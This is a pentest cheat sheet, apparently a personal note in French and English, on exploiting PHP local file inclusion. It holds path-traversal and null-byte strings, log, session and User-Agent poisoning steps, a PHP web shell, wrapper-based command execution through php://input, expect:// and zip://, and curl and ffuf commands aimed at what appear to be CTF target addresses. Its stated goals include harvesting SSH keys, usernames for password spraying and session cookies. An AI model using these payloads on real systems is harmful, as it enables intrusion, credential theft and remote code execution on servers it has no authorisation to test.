# LFI Local File inclusion


## Methodologie

1. Read /etc/passwd and potentially find SSH Keys or know valid user names for a password spray attack
2. Find other services on the box such as Tomcat and read the tomcat-users.xml file
3. Discover valid PHP Session Cookies and perform session hijacking
4. Read current web application configuration and gain access to the secret used to protect cookies. In some frameworks, this cookie gets unserialized in an unsafe manner, and just reading the configuration can lead to remote code execution


## basic:

exemple

```txt
../../../../../../../../../etc/passwd
....//....//....//....//....//....//....//....//etc/passwd
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
php://filter/read=/resource=/etc/passwd
```

## extention bypass:

exemple :

```txt
language=/etc/passwd%00
/etc/passwd\x00
```

## Alias mal configurés

Une mauvaise configuration entre "/dossier/" et "/dossier" peut donner accès à certains `path traversal`. exemple pour Nginx: 

```txt
http://site/assets../
```

Attention également aux erreurs de conf de la racine, par exemple si on a la directive `root /etc/nginx;` alors `/` renvoi vers `/etc/nginx` et on a accès a la conf du serveur !

## LFI to RCE:

exemple d'injection puis d'execution via les logs

```txt
http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?>
http://10.10.10.173/getPatent_alphav1.0.php?id=..././..././..././..././..././var/log/apache2/error.log&cmd=id
```

autres pistes :


```txt
/var/log/nginx/access.log
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
/proc/self/environ (injection possible via “User-Agent” sur les vieux serveurs)
/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3 #la chaine de char correspond au cookie
/proc/self/fd/(brute force int)
```

### session poisoning: (faire les 2 requetes dans l'ordre)

```txt
http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?>
http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

exemple curl:

```txt
curl -s -X POST --data "<?php system('id'); ?>" "http://143.110.174.100:30453/index.php?language=php://input" |grep uid
curl http://10.10.10.151/blog/?lang=php://input -d '<? system('id');?>'
```


exemple CTF: 

```txt
http://10.10.10.173/getPatent_alphav1.0.php?id=..././..././..././..././..././etc/passwd
http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//etc/passwd
http://165.232.47.168:30259/index.php?page=./industries 
http://165.232.47.168:30259/index.php?page=index 
http://165.232.47.168:30259/index.php?page=php://filter/read=convert.base64-encode/resource=index

user-agent (que l'on retrouve dans les logs)
user-agent: <?php system($_GET['cmd']); ?>
http://165.232.47.168:30272/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id
```

exemple IIS:

```txt
http://10.10.10.151/blog/?lang=//localhost/c$/Windows/win.ini
```


autres exemples :

```txt
envoyer du code PHP dans les logs ou les mail puis executer le code via la LFI
http://10.10.10.173/getPatent_alphav1.0.php?id=..././..././..././..././..././var/log/apache2/error.log
```



| **Command** | **Description** |
| --------------|-------------------|
| `php://filter/read=convert.base64-encode/resource=/etc/passwd` | PHP filter to convert file contents to Base64 |
| `php://filter/read=string.rot13/resource=/etc/passwd`   | PHP filter to convert file contents to ROT13 |
| `expect://id` | Command execution with PHP `Expect` wrapper |
| `curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input"` | Using PHP `Input` wrapper for command execution |
| `zip://malicious.zip%23exec.php&cmd=id` | Command execution with the PHP `Zip` wrapper |
| `<?php system($_GET['cmd']); ?>` | PHP web shell file contents (i.e., shell.php) |


### Wrapper

à tester :  `http://`, `ftp://`, `https://` , `zip:`


pour aller plus loin:

```sh
ffuf -w ../SecLists-master/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt:FUZZ -u http://127.0.0.1:1080/nav.php?page=FUZZ -fs 0
```



